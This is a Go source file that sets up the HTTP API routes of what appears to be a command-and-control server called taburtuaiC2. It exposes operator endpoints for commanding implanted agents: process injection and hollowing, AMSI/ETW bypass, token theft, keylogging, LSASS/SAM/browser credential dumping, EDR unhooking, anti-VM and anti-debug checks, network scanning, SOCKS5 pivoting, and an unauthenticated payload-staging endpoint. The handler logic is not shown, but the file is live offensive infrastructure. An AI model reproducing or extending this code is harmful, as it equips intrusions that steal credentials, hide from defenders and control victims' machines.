package api

import (
	"net/http"

	"github.com/gin-gonic/gin"
	"github.com/mjopsec/taburtuaiC2/internal/core"
)

// Router handles API routing
type Router struct {
	server     *core.Server
	handlers   *Handlers
	middleware *Middleware
}

// NewRouter creates a new router
func NewRouter(server *core.Server) *Router {
	return &Router{
		server:     server,
		handlers:   NewHandlers(server),
		middleware: NewMiddleware(server),
	}
}

// Setup configures all routes
func (r *Router) Setup() *gin.Engine {
	router := gin.New()

	// Global middleware (no body-size limit here — applied per group below)
	router.Use(gin.Recovery())
	router.Use(r.middleware.ErrorRecovery())
	router.Use(r.middleware.SecurityHeaders())
	router.Use(r.middleware.CORS())
	router.Use(r.middleware.ValidateContentType())
	router.Use(r.middleware.Logging())
	router.Use(r.middleware.RateLimit())
	router.Use(r.middleware.Auth())

	// Static files
	router.Static("/static", "./web/static")
	router.LoadHTMLGlob("web/templates/*")
	router.GET("/", r.handlers.Dashboard)

	// ── Routes with 10 MB body limit ─────────────────────────────────────────
	// All standard API routes. The limit is applied at the group level so it
	// is installed once (before the route handler) and wraps the raw body.
	v1 := router.Group("/api/v1")
	v1.Use(r.middleware.RequestSizeLimit(10 * 1024 * 1024))
	{
		// Agent management
		v1.GET("/agents", r.handlers.ListAgents)
		v1.GET("/agents/:id", r.handlers.GetAgent)
		v1.DELETE("/agents/:id", r.handlers.RemoveAgent)
		v1.POST("/checkin", r.handlers.AgentCheckin)

		// Command execution
		v1.POST("/command", r.handlers.ExecuteCommand)
		v1.GET("/command/:id/next", r.handlers.GetNextCommand)
		v1.POST("/command/result", r.handlers.SubmitCommandResult)
		v1.GET("/command/:id/status", r.handlers.GetCommandStatus)

		// Agent commands
		v1.GET("/agent/:id/commands", r.handlers.GetAgentCommands)
		v1.DELETE("/agent/:id/queue", r.handlers.ClearAgentQueue)

		// File download (agent → operator)
		v1.POST("/agent/:id/download", r.handlers.DownloadFromAgent)

		// Process management
		v1.POST("/agent/:id/process/list", r.handlers.ListProcesses)
		v1.POST("/agent/:id/process/kill", r.handlers.KillProcess)
		v1.POST("/agent/:id/process/start", r.handlers.StartProcess)

		// Persistence
		v1.POST("/agent/:id/persistence/setup", r.handlers.SetupPersistence)
		v1.POST("/agent/:id/persistence/remove", r.handlers.RemovePersistence)

		// ADS & LOLBin
		v1.POST("/agent/:id/ads/exec", r.handlers.ADSExec)
		v1.POST("/agent/:id/fetch", r.handlers.LOLBinFetch)

		// Phase 2 — injection / timestomp
		v1.POST("/agent/:id/inject/remote", r.handlers.InjectRemote)
		v1.POST("/agent/:id/inject/self", r.handlers.InjectSelf)
		v1.POST("/agent/:id/timestomp", r.handlers.Timestomp)
		v1.POST("/agent/:id/process/ppid", r.handlers.PPIDSpawn)

		// Phase 3 — AMSI/ETW bypass
		v1.POST("/agent/:id/bypass/amsi", r.handlers.AMSIBypass)
		v1.POST("/agent/:id/bypass/etw", r.handlers.ETWBypass)

		// Phase 3 — Token manipulation
		v1.POST("/agent/:id/token/list", r.handlers.TokenList)
		v1.POST("/agent/:id/token/steal", r.handlers.TokenSteal)
		v1.POST("/agent/:id/token/make", r.handlers.TokenMake)
		v1.POST("/agent/:id/token/revert", r.handlers.TokenRevert)

		// Phase 3 — Reconnaissance
		v1.POST("/agent/:id/screenshot", r.handlers.Screenshot)
		v1.POST("/agent/:id/keylog/start", r.handlers.KeylogStart)
		v1.POST("/agent/:id/keylog/dump", r.handlers.KeylogDump)
		v1.POST("/agent/:id/keylog/stop", r.handlers.KeylogStop)

		// Phase 4 — Advanced injection
		v1.POST("/agent/:id/inject/hollow", r.handlers.Hollow)
		v1.POST("/agent/:id/inject/hijack", r.handlers.Hijack)
		v1.POST("/agent/:id/inject/stomp", r.handlers.Stomp)
		v1.POST("/agent/:id/inject/map", r.handlers.MapInject)

		// Phase 5 — Credential access
		v1.POST("/agent/:id/creds/lsass", r.handlers.LSASSDump)
		v1.POST("/agent/:id/creds/sam", r.handlers.SAMDump)
		v1.POST("/agent/:id/creds/browser", r.handlers.BrowserCreds)
		v1.POST("/agent/:id/creds/clipboard", r.handlers.ClipboardRead)

		// Phase 6-7 — Evasion
		v1.POST("/agent/:id/evasion/sleep", r.handlers.SleepObf)
		v1.POST("/agent/:id/evasion/unhook", r.handlers.UnhookNTDLL)

		// Phase 8 — Hardware breakpoints
		v1.POST("/agent/:id/evasion/hwbp/set", r.handlers.HWBPSet)
		v1.POST("/agent/:id/evasion/hwbp/clear", r.handlers.HWBPClear)

		// Phase 9 — BOF execution
		v1.POST("/agent/:id/bof", r.handlers.BOFExec)

		// Phase 10 — OPSEC
		v1.POST("/agent/:id/opsec/antidebug", r.handlers.AntiDebug)
		v1.POST("/agent/:id/opsec/antivm", r.handlers.AntiVM)
		v1.POST("/agent/:id/opsec/timegate", r.handlers.TimeGateSet)

		// Phase 11 — Network recon
		v1.POST("/agent/:id/pivot/netscan", r.handlers.NetScan)
		v1.POST("/agent/:id/pivot/arpscan", r.handlers.ARPScan)

		// Phase 11 — Registry
		v1.POST("/agent/:id/registry/read", r.handlers.RegRead)
		v1.POST("/agent/:id/registry/write", r.handlers.RegWrite)
		v1.POST("/agent/:id/registry/delete", r.handlers.RegDelete)
		v1.POST("/agent/:id/registry/list", r.handlers.RegList)

		// Phase 11 — SOCKS5 pivot
		v1.POST("/agent/:id/pivot/socks5/start", r.handlers.SOCKS5Start)
		v1.POST("/agent/:id/pivot/socks5/stop", r.handlers.SOCKS5Stop)
		v1.POST("/agent/:id/pivot/socks5/status", r.handlers.SOCKS5Status)

		// Stage management (list + delete are tiny)
		v1.GET("/stages", r.handlers.ListStages)
		v1.DELETE("/stage/:token", r.handlers.DeleteStage)

		// Monitoring
		v1.GET("/stats", r.handlers.GetStats)
		v1.GET("/health", r.handlers.HealthCheck)
		v1.GET("/logs", r.handlers.GetLogs)
		v1.GET("/queue/stats", r.handlers.GetQueueStats)
	}

	// ── Routes that manage their own (large) body limits ─────────────────────
	// These are on a separate group so the 10 MB group middleware above does
	// not wrap their bodies before their own MaxBytesReader runs.
	upload := router.Group("/api/v1")
	{
		// Operator → agent file push (up to 100 MB)
		upload.POST("/agent/:id/upload", func(c *gin.Context) {
			c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, 100*1024*1024)
			r.handlers.UploadToAgent(c)
		})

		// Stage payload upload — base64 JSON, up to ~67 MB for a 50 MB binary
		upload.POST("/stage", func(c *gin.Context) {
			c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, 100*1024*1024)
			r.handlers.CreateStage(c)
		})
	}

	// Public stage delivery endpoint — no auth, token is the credential
	router.GET("/stage/:token", r.handlers.ServeStage)

	return router
}
